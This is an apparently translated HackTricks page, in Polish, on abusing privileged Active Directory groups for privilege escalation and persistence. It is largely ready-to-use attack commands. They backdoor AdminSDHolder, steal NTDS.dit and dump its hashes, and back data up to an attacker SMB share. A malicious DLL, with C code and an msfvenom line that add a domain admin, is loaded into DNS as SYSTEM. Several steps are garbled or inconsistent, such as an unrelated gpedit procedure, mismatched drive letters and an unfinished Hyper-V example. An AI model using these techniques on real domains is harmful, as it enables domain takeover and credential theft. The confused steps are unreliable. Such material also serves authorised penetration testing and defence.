# Grupy z uprawnieniami administratora

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Powszechnie znane grupy z uprawnieniami administracyjnymi

* **Administratorzy**
* **Administratorzy domeny**
* **Administratorzy przedsiębiorstwa**

## Operatorzy konta

Ta grupa ma uprawnienia do tworzenia kont i grup, które nie są administratorami domeny. Dodatkowo umożliwia lokalne logowanie do kontrolera domeny (DC).

Aby zidentyfikować członków tej grupy, wykonuje się następujące polecenie:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dodawanie nowych użytkowników jest dozwolone, a także lokalne logowanie do DC01.

## Grupa AdminSDHolder

Lista kontroli dostępu (ACL) grupy **AdminSDHolder** jest kluczowa, ponieważ ustawia uprawnienia dla wszystkich "chronionych grup" w Active Directory, w tym grup o wysokich uprawnieniach. Ten mechanizm zapewnia bezpieczeństwo tych grup, uniemożliwiając nieautoryzowane modyfikacje.

Atakujący może wykorzystać to, modyfikując ACL grupy **AdminSDHolder**, nadając pełne uprawnienia standardowemu użytkownikowi. Spowoduje to efektywne nadanie temu użytkownikowi pełnej kontroli nad wszystkimi chronionymi grupami. Jeśli uprawnienia tego użytkownika zostaną zmienione lub usunięte, zostaną automatycznie przywrócone w ciągu godziny ze względu na projekt systemu.

Polecenia do przeglądania członków i modyfikowania uprawnień obejmują:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Dostępny jest skrypt, który przyspiesza proces przywracania: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Aby uzyskać więcej szczegółów, odwiedź [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Kosz Active Directory

Członkostwo w tej grupie umożliwia odczyt usuniętych obiektów Active Directory, co może ujawnić poufne informacje:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Dostęp do kontrolera domeny

Dostęp do plików na kontrolerze domeny jest ograniczony, chyba że użytkownik jest częścią grupy `Operatorzy serwera`, co zmienia poziom dostępu.

### Eskalacja uprawnień

Za pomocą narzędzi `PsService` lub `sc` z Sysinternals można sprawdzać i modyfikować uprawnienia usług. Grupa `Operatorzy serwera`, na przykład, ma pełną kontrolę nad określonymi usługami, co umożliwia wykonywanie dowolnych poleceń i eskalację uprawnień:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ten polecenie ujawnia, że `Operatorzy serwera` mają pełny dostęp, umożliwiający manipulację usługami w celu uzyskania podwyższonych uprawnień.

## Operatorzy kopii zapasowych

Członkostwo w grupie `Operatorzy kopii zapasowych` umożliwia dostęp do systemu plików `DC01` dzięki uprawnieniom `SeBackup` i `SeRestore`. Te uprawnienia umożliwiają nawigację po folderach, wyświetlanie listy i kopiowanie plików, nawet bez udzielonych uprawnień, przy użyciu flagi `FILE_FLAG_BACKUP_SEMANTICS`. Do tego procesu konieczne jest użycie określonych skryptów.

Aby wyświetlić członków grupy, wykonaj:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Atak lokalny

Aby wykorzystać te uprawnienia lokalnie, stosuje się następujące kroki:

1. Importuj niezbędne biblioteki:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Włącz i zweryfikuj `SeBackupPrivilege`:

```plaintext
1. Otwórz narzędzie "Lokalne zasady grupy" (`gpedit.msc`).
2. Przejdź do "Konfiguracja komputera" > "Ustawienia systemu Windows" > "Ustawienia zabezpieczeń" > "Strategie lokalne" > "Przydział uprawnień użytkowników".
3. Znajdź uprawnienie "Tworzenie kopii zapasowych plików i katalogów" (`SeBackupPrivilege`).
4. Dodaj odpowiednie konta do tego uprawnienia, takie jak "Administratorzy" lub "Użytkownicy".
5. Aby zweryfikować, czy uprawnienie zostało poprawnie włączone, otwórz wiersz polecenia jako administrator i wykonaj polecenie `whoami /priv`. Upewnij się, że `SeBackupPrivilege` jest wymienione jako jedno z uprawnień.
```

Więcej informacji na temat uprawnień tokena można znaleźć [tutaj](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Uzyskaj dostęp i skopiuj pliki z ograniczonych katalogów, na przykład:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Atak na AD

Bezpośredni dostęp do systemu plików kontrolera domeny umożliwia kradzież bazy danych `NTDS.dit`, która zawiera wszystkie hashe NTLM dla użytkowników i komputerów domeny.

#### Użycie diskshadow.exe

1. Utwórz kopię cienia dysku `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Skopiuj `NTDS.dit` z kopii cienia:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatywnie, użyj `robocopy` do kopiowania plików:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Wyodrębnij `SYSTEM` i `SAM` w celu odzyskania hasha:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pobierz wszystkie hashe z pliku `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Używanie wbadmin.exe

1. Skonfiguruj system plików NTFS dla serwera SMB na maszynie atakującej i zapisz dane uwierzytelniające SMB na maszynie docelowej.
2. Użyj `wbadmin.exe` do tworzenia kopii zapasowej systemu i ekstrakcji pliku `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Aby zobaczyć praktyczną demonstrację, zobacz [FILM DEMONSTRACYJNY Z IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Członkowie grupy **DnsAdmins** mogą wykorzystać swoje uprawnienia do załadowania dowolnej biblioteki DLL z uprawnieniami SYSTEM na serwerze DNS, który często jest hostowany na kontrolerach domeny. Ta zdolność daje duży potencjał do wykorzystania.

Aby wyświetlić członków grupy DnsAdmins, użyj:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Wykonaj dowolną DLL

Członkowie mogą sprawić, że serwer DNS załaduje dowolną DLL (lokalnie lub z udziału zdalnego) za pomocą poleceń takich jak:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Konieczne jest ponowne uruchomienie usługi DNS (co może wymagać dodatkowych uprawnień), aby załadować plik DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Aby uzyskać więcej szczegółów na temat tego wektora ataku, odwołaj się do ired.team.

#### Mimilib.dll
Możliwe jest również użycie mimilib.dll do wykonania poleceń, modyfikując go w celu wykonania określonych poleceń lub odwrócenia powłoki. [Sprawdź ten post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) dla więcej informacji.

### Rekord WPAD dla ataku MitM
DnsAdmins mogą manipulować rekordami DNS w celu przeprowadzenia ataków typu Man-in-the-Middle (MitM), tworząc rekord WPAD po wyłączeniu globalnej listy blokowania zapytań. Narzędzia takie jak Responder lub Inveigh mogą być używane do podszywania się i przechwytywania ruchu sieciowego.

### Czytelnicy dziennika zdarzeń
Członkowie mogą uzyskać dostęp do dzienników zdarzeń, potencjalnie znajdując wrażliwe informacje, takie jak hasła w postaci tekstowej lub szczegóły wykonania poleceń:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Uprawnienia systemu Windows dla Exchange
Ta grupa może modyfikować DACL na obiekcie domeny, co potencjalnie umożliwia przyznanie uprawnień DCSync. Techniki eskalacji uprawnień wykorzystujące tę grupę są szczegółowo opisane w repozytorium GitHub Exchange-AD-Privesc.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Administratorzy Hyper-V
Administratorzy Hyper-V mają pełny dostęp do Hyper-V, co można wykorzystać do przejęcia kontroli nad wirtualnymi kontrolerami domeny. Obejmuje to klonowanie aktywnych kontrolerów domeny i wydobywanie skrótów NTLM z pliku NTDS.dit.

### Przykład wykorzystania
Usługa konserwacji Mozilli Firefox może zostać wykorzystana przez administratorów Hyper-V do wykonania poleceń jako SYSTEM. Polega to na utworzeniu twardego linku do chronionego pliku SYSTEM i zastąpieniu go złośliwym plikiem wykonywalnym:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
## Zarządzanie organizacją

W środowiskach, w których jest wdrożony **Microsoft Exchange**, istnieje specjalna grupa o nazwie **Organization Management**, która posiada znaczące uprawnienia. Ta grupa ma uprzywilejowany dostęp do **skrzynek pocztowych wszystkich użytkowników domeny** oraz pełną kontrolę nad jednostką organizacyjną (OU) **'Microsoft Exchange Security Groups'**. Ta kontrola obejmuje grupę **`Exchange Windows Permissions`**, która może być wykorzystana do eskalacji uprawnień.

### Wykorzystanie uprawnień i polecenia

#### Operatorzy drukowania
Członkowie grupy **Operatorzy drukowania** mają wiele uprawnień, w tym **`SeLoadDriverPrivilege`**, które pozwala im **zalogować się lokalnie do kontrolera domeny**, wyłączyć go i zarządzać drukarkami. Aby wykorzystać te uprawnienia, zwłaszcza jeśli **`SeLoadDriverPrivilege`** nie jest widoczne w kontekście bez podniesienia uprawnień, konieczne jest obejście Kontroli Konta Użytkownika (UAC).

Aby wyświetlić członków tej grupy, używane jest następujące polecenie PowerShell:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Aby uzyskać bardziej szczegółowe techniki eksploatacji związane z **`SeLoadDriverPrivilege`**, należy skonsultować się z konkretnymi zasobami dotyczącymi bezpieczeństwa.

#### Użytkownicy zdalnego pulpitu
Członkowie tej grupy mają dostęp do komputerów za pośrednictwem protokołu zdalnego pulpitu (RDP). Aby wyliczyć tych członków, dostępne są polecenia PowerShell:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalsze informacje na temat wykorzystywania RDP można znaleźć w dedykowanych zasobach do testowania penetracyjnego.

#### Użytkownicy zarządzania zdalnego
Członkowie mogą uzyskać dostęp do komputerów za pomocą **Windows Remote Management (WinRM)**. Wyliczenie tych członków jest osiągane poprzez:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Do technik eksploatacji związanych z **WinRM**, należy skonsultować się z odpowiednią dokumentacją.

#### Operatorzy serwera
Ta grupa ma uprawnienia do wykonywania różnych konfiguracji na kontrolerach domeny, w tym uprawnień do tworzenia kopii zapasowych i przywracania, zmiany czasu systemowego oraz wyłączania systemu. Aby wyświetlić członków tej grupy, należy użyć polecenia:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Odwołania <a href="#odwołania" id="odwołania"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
